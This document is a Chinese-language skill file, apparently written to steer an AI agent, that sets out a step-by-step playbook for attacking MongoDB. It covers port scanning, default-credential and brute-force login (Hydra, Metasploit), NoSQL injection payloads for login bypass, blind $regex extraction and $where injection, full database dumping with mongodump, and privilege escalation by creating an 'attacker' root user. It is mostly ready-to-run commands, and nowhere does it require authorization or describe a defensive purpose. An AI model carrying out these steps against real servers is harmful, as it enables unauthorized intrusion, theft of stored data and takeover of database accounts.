---
name: mongodb-attack
description: "MongoDB 未授权访问与 NoSQL 注入利用。当发现目标开放 27017 端口、MongoDB 服务无认证、Web 应用使用 MongoDB 后端存在 NoSQL 注入、或需要从 MongoDB 提取数据时使用。覆盖未授权访问、数据库枚举与导出、NoSQL 注入（$ne/$regex/$where/盲注）、JavaScript 执行（mapReduce/eval）、权限提升、GridFS 文件提取、配置文件凭据"
metadata:
  tags: "mongodb,mongo,27017,nosql,nosql-injection,$ne,$regex,$where,mapreduce,gridfs,未授权,mongodump"
  category: "exploit"
---

# MongoDB 未授权访问与 NoSQL 注入利用

MongoDB 默认监听 27017 端口且早期版本无需认证，暴露在网络上时面临完整数据泄露风险。同时，使用 MongoDB 的 Web 应用普遍存在 NoSQL 注入漏洞。

## ⛔ 深入参考（必读）
- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现与版本识别

### 1.1 Nmap 扫描

```bash
# MongoDB 信息收集脚本
nmap -p 27017 --script mongodb-info TARGET

# 版本探测
nmap -sV -p 27017 TARGET

# 检查 MongoDB 相关端口（27017 默认、27018 shardsvr、27019 configsvr、28017 HTTP 状态页）
nmap -p 27017-27019,28017 TARGET
```

### 1.2 手动连接测试

```bash
# mongosh 连接（MongoDB 5.0+ 推荐客户端）
mongosh --host TARGET --port 27017

# legacy mongo shell（MongoDB 4.x 及更早版本）
mongo --host TARGET --port 27017

# 快速版本检测
mongosh --host TARGET --port 27017 --eval "db.version()"

# 服务器状态
mongosh --host TARGET --port 27017 --eval "db.serverStatus()"
```

**关键判断**：
- 连接成功且无认证提示 → 未授权访问，直接进入 Phase 3
- 返回 `Authentication failed` → 需要认证，进入 Phase 2
- `db.version()` → 确定版本，决定可用攻击路径（eval 在 4.2 后移除）

---

## Phase 2: 未授权/弱口令检测

### 2.1 无密码连接测试

```bash
# 直接连接后尝试操作
mongosh --host TARGET --port 27017 --eval "show dbs"
# 成功返回数据库列表 → 无认证
```

### 2.2 默认凭据检测

```bash
# 常见默认账号密码
mongosh --host TARGET --port 27017 -u admin -p admin --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u root -p root --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p 123456 --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u mongodb -p mongodb --authenticationDatabase admin
```

### 2.3 爆破工具

```bash
# Hydra
hydra -L users.txt -P passwords.txt TARGET mongodb

# Nmap
nmap -p 27017 --script mongodb-brute TARGET

# Metasploit
msf> use auxiliary/scanner/mongodb/mongodb_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: 攻击决策树

```
连接成功？
├─ 无认证 → 数据库枚举 + mongodump 全量导出 (Phase 5)
├─ Web 应用 NoSQL 注入
│   ├─ 登录绕过 → {"$ne": ""} / {"$regex": ".*"} (Phase 4)
│   ├─ 数据提取 → $regex 逐字符盲注 (Phase 4)
│   └─ RCE → $where + JS 执行 (Phase 4)
├─ 有低权限 → createUser 提权 / grantRolesToUser
│   → 读 references/attack-techniques.md 第 5 节
├─ 有 eval 权限 → db.eval() / mapReduce JS 执行
│   → 读 references/attack-techniques.md 第 4 节
└─ 有文件系统访问 → GridFS 文件提取 / 配置文件读取
    → 读 references/attack-techniques.md 第 6、7 节
```

**前置信息收集**：

```bash
# 当前用户角色信息
mongosh --host TARGET --port 27017 --eval "db.runCommand({connectionStatus: 1})"

# 获取服务器配置参数
mongosh --host TARGET --port 27017 --eval "db.adminCommand({getCmdLineOpts: 1})"

# 列出所有用户（需要 admin 库权限）
mongosh --host TARGET --port 27017 --eval "use admin; db.system.users.find().forEach(printjson)"
```

---

## Phase 4: NoSQL 注入速查

### 4.1 登录绕过

```
# HTTP POST（JSON 格式）
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

# URL 参数格式
username[$ne]=&password[$ne]=
username=admin&password[$regex]=.*
```

### 4.2 数据提取（$regex 盲注模式）

```
# 逐字符猜解密码
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
...
```

### 4.3 JavaScript 注入

```
# $where 条件注入
{"$where": "this.username == 'admin' && this.password == 'secret'"}

# 时间盲注
{"$where": "if(this.username=='admin'){sleep(5000);return true}"}
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 NoSQL 注入 payload

---

## Phase 5: 数据导出速查

### 5.1 数据库枚举

```bash
# 列出所有数据库
mongosh --host TARGET --port 27017 --eval "db.getMongo().getDBNames()"

# 列出集合
mongosh --host TARGET --port 27017 --eval "use database_name; show collections"

# 查看集合文档数
mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.countDocuments({})"

# 搜索敏感字段
mongosh --host TARGET --port 27017 --eval "use database_name; db.collection.find({password: {\$exists: true}})"
```

### 5.2 全量导出

```bash
# 导出所有数据库
mongodump --host TARGET --port 27017 --out /tmp/mongodb-dump

# 导出指定数据库
mongodump --host TARGET --port 27017 -d database_name --out /tmp/mongodb-dump

# 导出为 JSON 格式
mongoexport --host TARGET --port 27017 -d database_name -c collection_name --out /tmp/data.json

# 带认证的导出
mongodump --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin --out /tmp/mongodb-dump
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整数据导出命令

---

## Phase 6: JavaScript 执行与权限提升

### 6.1 db.eval() (MongoDB < 4.2)

```javascript
// 执行任意 JavaScript（需要 admin 权限）
db.eval("return db.getMongo().getDBNames()")
```

### 6.2 mapReduce JS 执行

```javascript
// 通过 mapReduce 执行 JavaScript
db.collection.mapReduce(
  function() { emit(this._id, 1); },
  function(k, v) { return Array.sum(v); },
  { out: "result" }
)
```

### 6.3 权限提升速查

```javascript
// 创建管理员用户
db.createUser({user: "attacker", pwd: "password", roles: [{role: "userAdminAnyDatabase", db: "admin"}]})

// 提升已有用户权限
db.grantRolesToUser("attacker", [{role: "root", db: "admin"}])
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 JS 执行与提权命令

---

## 工具速查

| 工具 | 用途 |
|------|------|
| mongosh / mongo | MongoDB 客户端（mongosh 为新版，mongo 为旧版） |
| mongodump | 数据库全量导出（BSON 格式） |
| mongoexport | 集合 JSON/CSV 导出 |
| mongofiles | GridFS 文件操作工具 |
| NoSQLMap | NoSQL 注入自动化扫描与利用 |
| nosqlinjection | Burp Suite NoSQL 注入插件 |
| nmap mongodb-info | MongoDB 信息收集 NSE 脚本 |

---

## 注意事项

- MongoDB 3.0 之前默认无认证、绑定 0.0.0.0，暴露实例极多
- MongoDB 3.6+ 默认绑定 localhost，需确认是否暴露在外网
- `db.eval()` 在 MongoDB 4.2 中已移除，4.2+ 版本不可用
- `mongodump` 全量导出时注意数据量，大库可能耗时很长
- NoSQL 注入的 `$where` 操作非常慢，生产环境可能引起性能问题
- 操作 admin 库的 `system.users` 可直接获取所有用户凭据哈希
- GridFS 中可能存储大量二进制文件（图片、文档），选择性下载
- 配置文件 `/etc/mongod.conf` 中可能包含明文 keyFile 路径和绑定配置
